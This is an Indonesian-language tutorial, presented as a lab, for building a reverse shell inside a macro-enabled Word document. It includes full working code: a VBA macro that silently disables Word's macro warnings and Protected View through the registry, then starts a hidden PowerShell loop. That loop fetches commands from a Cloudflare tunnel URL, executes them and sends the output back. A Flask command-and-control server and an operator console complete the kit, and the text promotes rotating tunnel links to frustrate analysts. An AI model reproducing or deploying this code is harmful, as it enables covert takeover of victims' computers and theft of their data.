# Menggunakan Konsep Macro dalam Bentuk .docm

###### Materi: penjelasan umum terkait lab reverse shell

###### Media: docx/docm + cloudflareTunneling

###### Prasarat: target harus menonaktifkan notifiakasi security MS-Word

---

**penjelasan**
Di pembahasan kali ini kita akan membahas cara membentuk reverse shell dalam `file .docm`, hal ini dibagun atas fitur kekuatan yang disediakan MS-Word. macro memungkinkan semua orang untuk menjalakan sistem secara otomatis dengan basis kekuatan yang kuat. hal ini yang nanti kita manfaatkan untuk mejalankan reverse shell.

**cara kerja**

- attacker membuat macro file dan disimpan dengan extensi `.docm`
- Didalam file terdapat module macro yang sudah di inject dengan url tunneling - ini yang akan berkomunikasi dengan kita
- korban membuka file > file berjalan > jalur komunikasi terbuka

**kelebihan & kekurangan**
Bisa saya sampaikan methode ini tidak sepenuhnay sempurna, ketika tulisan ini pertama kali saya buat. sebab ada kelebihan & kekurangan yang sangat jelas didalam methode ini.

**_kelebihan_**

- disini kita menggunakan http/https dalam melakukan percobaan ini (tidak dengan TCP murni). hal ini didasari dari ide saya dengan memanfaatkan cloudflare tunneling - ALASANYA ?
  - orang yang membedah file akan sedikit kesulitan membedah file ini sebab tidak ada pertinggal dari attcker - sebab Ling cloudflare tuneeling selalu berubah
  - gratis - ya , ini free kita bebas menggunakan nya berapa kali dan untuk penggunaan yang pernah saya coba ini cukp baik

**_kekurangan_**

- tidak seperti reverse shell lainnya , methode ini tidak bisa menjalankan command berat seperti membuka cmd.exe , namun masih bisa digunakan untuk promting di cmd korban tersebut - KENAPA ?- hal ini terjadi sebab kita menggunakan http/https untuk saling berkomunikasi tidak seperti TCP murni
- sedikit rumit - jika kita tidak menggunakan otomatisasi, ketika kita memulain setup kita harus menjalankannya satu per satu
- alert pada sistem - ya pada saat saya menjalankan ini , alert pada sistem tetap mucul sebab kita menjalakan konsep macro dan MS_WORD memberikna peringatan kepada user yang membuka file kita - satu satunya cara yaitu dengan user menonaktifkan alert tersebut

**Setup sistem**
Berikut langkah langkah dalam menjalakan sistem:

- jalankan cloudflare tuneeling - disini saya pakai `port 4444`
- kemudian buat module macro & sesuaikan `link tunneling` dengan yang berjalan - untuk module macro kamu bisa buat di tab `Developer` di MS-word
- lakukan save dengan extensi `.docm`
- jalankan script code `server shell. py` - disini jalur utama data berjalan & pastikna port sama dengan `tunneling`
- kemudian jalankan `send_cmd .py` - ini tempat kita memasukkan reverse shell
- ketika `target` membuka file , maka alur log data akan berjalan di `server shell.py`

**script code**

- script code `module macro` - pastikan sesuaikan setiap url tunneling & portnya

```VBA
Sub PhantomLink()
    Dim Objek_Shell As Object
    Dim URL_Shell As String
    Dim Perintah_PowerShell As String
    Dim AutoBypass As String

    On Error Resume Next
    Set Objek_Shell = CreateObject("WScript.Shell")

    URL_Shell = " https://tractor-thick-how-paintball.trycloudflare.com/dns-query"

    ' Auto bypass
    AutoBypass = "powershell -Command """ & _
        "$reg = 'HKCU:\Software\Microsoft\Office\16.0\Word\Security'; " & _
        "Set-ItemProperty -Path $reg -Name 'VBAWarnings' -Value 1 -ErrorAction SilentlyContinue; " & _
        "Set-ItemProperty -Path $reg -Name 'AccessVBOM' -Value 1 -ErrorAction SilentlyContinue; " & _
        "$pv = 'HKCU:\Software\Microsoft\Office\16.0\Word\Security\ProtectedView'; " & _
        "Set-ItemProperty -Path $pv -Name 'DisableInternetFiles' -Value 1 -ErrorAction SilentlyContinue; " & _
        "Set-ItemProperty -Path $pv -Name 'DisableAttachments' -Value 1 -ErrorAction SilentlyContinue; " & _
        "Set-ItemProperty -Path $pv -Name 'DisableUnsafeLocations' -Value 1 -ErrorAction SilentlyContinue" & _
        """"
    Objek_Shell.Run AutoBypass, 0, True

    ' Kill old PowerShell
    Objek_Shell.Run "powershell -Command ""Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {$_.Id -ne $PID} | Stop-Process -Force""", 0, True

    ' PERSISTENT REVERSE SHELL (FIXED)
    Perintah_PowerShell = "powershell -NoProfile -ExecutionPolicy Bypass -Command """ & _
        "$url = '" & URL_Shell & "'; " & _
        "Add-Type -AssemblyName System.Windows.Forms; " & _
        "[System.Windows.Forms.MessageBox]::Show('hai pwnd','PhantomLink'); " & _
        "$i = 0; " & _
        "while($true) { " & _
        "$i++; " & _
        "try { " & _
        "$cmd = (Invoke-RestMethod -Uri ($url + '?action=get_command') -Method Get -TimeoutSec 10); " & _
        "if($cmd -eq 'exit') { break }; " & _
        "if($cmd -and $cmd -ne 'IDLE') { " & _
        "Start-Job -ScriptBlock { " & _
        "param($c, $u) " & _
        "$res = (iex $c 2>&1 | Out-String); " & _
        "$enc = [uri]::EscapeDataString($res); " & _
        "$b = 'action=send_result&data=' + $enc; " & _
        "Invoke-RestMethod -Uri $u -Method Post -Body $b -ContentType 'application/x-www-form-urlencoded' -TimeoutSec 10 | Out-Null " & _
        "} -ArgumentList $cmd, $url | Out-Null; " & _
        "} " & _
        "Start-Sleep -Seconds 2; " & _
        "} catch { " & _
        "Start-Sleep -Seconds 3 " & _
        "} " & _
        "}" & _
        """"

    Objek_Shell.Run Perintah_PowerShell, 0, False
    Set Objek_Shell = Nothing
End Sub
```

- script code `server_shell.py`

```python
from flask import Flask, request
import urllib.parse
import threading

app = Flask(__name__)

# State Management
pending_command = None
command_lock = threading.Lock()

@app.route('/dns-query', methods=['GET', 'POST'])
def handler():
    global pending_command

    if request.method == 'GET':
        action = request.args.get('action', '')

        if action == 'get_command':
            with command_lock:
                if pending_command is not None:
                    cmd_to_send = pending_command
                    pending_command = None
                    print(f"[+] Command dikirim: {cmd_to_send}")
                    return cmd_to_send
                else:
                    return 'IDLE'

        elif action == 'ps_active':
            print("\n[*] TARGET CONNECTED!")
            print("[*] PhantomLink Active!\n")
            return 'OK'

    elif request.method == 'POST':
        action = request.form.get('action', '')

        if action == 'send_result':
            data = request.form.get('data', '')
            if data:
                decoded = urllib.parse.unquote(data)
                print(f"\n{'='*50}")
                print(f"[Result]:")
                print(decoded)
                print(f"{'='*50}\n")
            return 'OK'

    return 'OK'

@app.route('/admin/send', methods=['GET'])
def admin_send():
    global pending_command
    cmd = request.args.get('cmd', '')
    if cmd:
        with command_lock:
            pending_command = cmd
        print(f"[*] Command diantrekan: {cmd}")
        return f'OK: {cmd}'
    return 'Gunakan ?cmd=whoami'

if __name__ == '__main__':
    PORT = 4444
    print(f"[*] ==============================")
    print(f"[*] PhantomLink C2 Server")
    print(f"[*] Port: {PORT}")
    print(f"[*] ==============================\n")
    app.run(host='0.0.0.0', port=PORT, threaded=True, debug=False)
```

- script code `send_cmd.py`

```python
import requests

URL = "http://localhost:4444/admin/send"

print("[*] Admin Command Sender")
print("[*] Ketik 'exit' buat keluar\n")

while True:
    cmd = input("Shell> ")
    if cmd.lower() == 'exit':
        break
    if cmd.strip() == '':
        continue

    try:
        r = requests.get(URL, params={'cmd': cmd}, timeout=5)
        print(f"  -> {r.text}")
    except Exception as e:
        print(f"  -> Error: {e}")

print("\n[*] Admin panel ditutup.")
```
